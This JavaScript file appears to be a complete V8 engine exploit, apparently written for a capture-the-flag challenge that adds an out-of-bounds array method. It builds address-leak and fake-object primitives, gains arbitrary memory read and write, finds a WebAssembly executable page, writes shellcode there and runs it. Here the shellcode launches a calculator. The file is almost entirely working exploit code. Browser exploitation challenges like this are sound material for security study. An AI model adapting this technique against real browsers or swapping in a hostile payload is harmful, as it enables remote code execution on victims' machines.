/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var obj = {"A":1};
var obj_array = [obj];
var float_array = [1.1, 1.2, 1.3, 1.4];

var float_array_map = float_array.oob();
var obj_array_map = obj_array.oob();


function addrof(in_obj) {
	obj_array[0] = in_obj;
	obj_array.oob(float_array_map);
	let addr = obj_array[0];
	obj_array.oob(obj_array_map);
	return ftoi(addr);
}

function fakeobj(addr) {
	float_array[0] = itof(addr);
	float_array.oob(obj_array_map);
	let fake = float_array[0];
	float_array.oob(float_array_map);
	return fake;
}

var arb_rw_arr = [float_array_map, 1.2, 1.3, 1.4];
console.log("Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
	if(addr % 2n == 0)
		addr += 1n;
	
	let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
	arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
	return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
	
	let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
	arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
	fake[0] = itof(BigInt(val));
}

function copy_shellcode(addr, shellcode) {
	let buf = new ArrayBuffer(0x100);
	let dataview = new DataView(buf);
	let buf_addr = addrof(buf);
	let backing_store_addr = buf_addr + 0x20n;
	initial_arb_write(backing_store_addr, addr);
	
	for(let i =0; i<shellcode.length; i++) {
		dataview.setUint32(4*i, shellcode[i], true);
	}
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx_page = arb_read(addrof(wasm_instance)-1n+0x88n);
console.log("RWX wasm page @ 0x" + rwx_page.toString(16));

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];


copy_shellcode(rwx_page, shellcode);

console.log("Pop calc.exe");

f();

